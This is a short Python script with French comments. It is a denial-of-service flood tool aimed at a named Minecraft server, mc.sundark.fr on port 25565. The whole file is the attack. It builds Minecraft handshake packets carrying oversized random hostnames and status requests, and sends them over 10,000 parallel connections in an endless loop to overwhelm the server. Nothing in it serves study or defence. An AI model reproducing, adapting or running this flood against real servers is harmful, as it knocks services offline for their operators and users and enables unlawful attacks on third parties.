import asyncio
import struct
import random
import string

TARGET_HOST = "mc.sundark.fr"   # ← ou IP directe
TARGET_PORT = 25565
CONNECTIONS = 10000              # ← Change ici le nombre de connexions en parallèle

def mc_varint(value):
    out = b""
    while True:
        if (value & ~0x7F) == 0:
            out += struct.pack("B", value)
            return out
        out += struct.pack("B", (value & 0x7F) | 0x80)
        value >>= 7

def big_hostname(length=1500):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_packet():
    host = big_hostname(random.randint(2000, 3000))
    port = TARGET_PORT
    protocol_version = 47  # Minecraft 1.8.9

    handshake = b""
    handshake += mc_varint(protocol_version)
    handshake += mc_varint(len(host)) + host.encode("utf-8")
    handshake += struct.pack(">H", port)
    handshake += mc_varint(1)

    packet = mc_varint(len(handshake) + 1)
    packet += b'\x00'  # Packet ID 0 (handshake)
    packet += handshake

    request = b'\x01\x00'  # Status request

    return packet + request

async def flood_once():
    try:
        reader, writer = await asyncio.open_connection(TARGET_HOST, TARGET_PORT)
        packet = create_packet()
        writer.write(packet)
        await writer.drain()
        print(f"[+] Paquet ({len(packet)} octets) envoyé")
        await asyncio.sleep(0.5)  # Garde la connexion ouverte un peu
        writer.close()
        await writer.wait_closed()
    except Exception as e:
        print(f"[!] Échec d’envoi : {e}")

async def main():
    while True:
        tasks = [flood_once() for _ in range(CONNECTIONS)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[✋] Arrêté par l'utilisateur")
